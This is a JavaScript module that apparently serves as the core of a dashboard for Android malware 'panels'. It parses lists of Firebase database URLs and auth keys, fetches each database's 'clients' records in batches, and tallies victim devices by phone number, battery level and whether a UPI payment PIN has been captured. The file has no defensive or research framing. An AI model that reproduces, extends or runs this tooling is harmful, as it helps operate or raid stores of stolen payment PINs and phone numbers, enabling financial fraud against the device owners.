/** Firebase RTDB panel helpers (APK index.html jaisa core) */

export function normalizeFirebaseUrl(url) {
  if (!url) return '';
  url = url.trim().replace(/[",\]\)]+$/, '').replace(/\/$/, '');
  if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
  return url;
}

export function isFirebaseDbUrl(url) {
  return /firebaseio\.com|firebasedatabase\.app/i.test(url || '');
}

export function parseTxtCredentials(content) {
  const map = new Map();
  const text = String(content || '');
  const register = (url, key) => {
    url = normalizeFirebaseUrl(url);
    key = String(key || '').trim();
    if (!url || !key || !isFirebaseDbUrl(url)) return;
    const k = url.toLowerCase();
    if (!map.has(k)) map.set(k, { url, key, name: panelName(url) });
  };
  const pairRe = /(https?:\/\/[^\s,'"<>]+(?:firebaseio\.com|firebasedatabase\.app)[^\s,'"<>]*)\s*[,|;\t]\s*([A-Za-z0-9_\-./+=]{8,})/gi;
  let pm;
  while ((pm = pairRe.exec(text)) !== null) register(pm[1], pm[2]);
  for (const line of text.split(/\r?\n/)) {
    const t = line.trim();
    if (!t || t.startsWith('#')) continue;
    const urlMatch = t.match(/(https?:\/\/[^\s,'"<>]+(?:firebaseio\.com|firebasedatabase\.app)[^\s,'"<>]*)/i);
    if (!urlMatch) continue;
    const url = urlMatch[1];
    let key = t.match(/(?:auth\s*key|secret|key)\s*[:=]\s*['"]?([A-Za-z0-9_\-./+=]+)/i)?.[1];
    if (!key) {
      const idx = text.split(/\r?\n/).indexOf(line);
      const lines = text.split(/\r?\n/);
      for (let j = idx + 1; j < Math.min(idx + 5, lines.length); j++) {
        const n = lines[j].trim();
        if (/https?:\/\//i.test(n)) break;
        if (/^[A-Za-z0-9_\-./+=]{8,}$/.test(n) && !n.includes('firebase')) {
          key = n;
          break;
        }
      }
    }
    register(url, key);
  }
  return [...map.values()];
}

export function panelName(url) {
  try {
    return url.split('//')[1].split('-default')[0].split('.')[0];
  } catch {
    return 'panel';
  }
}

export async function firebaseGet(baseUrl, key, path, ms = 12000) {
  let url = normalizeFirebaseUrl(baseUrl);
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), ms);
  try {
    const res = await fetch(`${url}/${path}.json?${new URLSearchParams({ auth: key.trim() })}`, {
      signal: ctrl.signal,
      headers: { Accept: 'application/json' },
    });
    clearTimeout(timer);
    if (res.status === 404) return null;
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
  } catch (e) {
    clearTimeout(timer);
    throw e;
  }
}

export function parseDevices(data, panelUrl, panelKey, panelName) {
  if (!data || typeof data !== 'object') return [];
  return Object.entries(data)
    .map(([id, d]) => {
      if (!d || typeof d !== 'object') return null;
      const pin = d.upipin ?? d.upiPin;
      const hasPin = pin != null && String(pin).trim().length >= 4;
      return {
        id,
        panelUrl,
        panelKey,
        panelName,
        name: d.modelName || d.deviceName || d.model || d.name || id,
        status: !!d.status,
        battery: d.battery,
        hasPin,
        phone: d.mobNo || d.phone || d.mobile || '—',
      };
    })
    .filter(Boolean);
}

export async function fetchPanelDevices(panel) {
  const clients = await firebaseGet(panel.url, panel.key, 'clients');
  if (!clients) return [];
  return parseDevices(clients, panel.url, panel.key, panel.name);
}

export async function fetchAllPanels(panels, { batch = 10, onProgress } = {}) {
  const all = [];
  let done = 0;
  for (let i = 0; i < panels.length; i += batch) {
    const chunk = panels.slice(i, i + batch);
    const results = await Promise.allSettled(chunk.map(fetchPanelDevices));
    for (const r of results) {
      done++;
      if (r.status === 'fulfilled') all.push(...r.value);
      if (onProgress) onProgress(done, panels.length, all.length);
    }
  }
  return all;
}
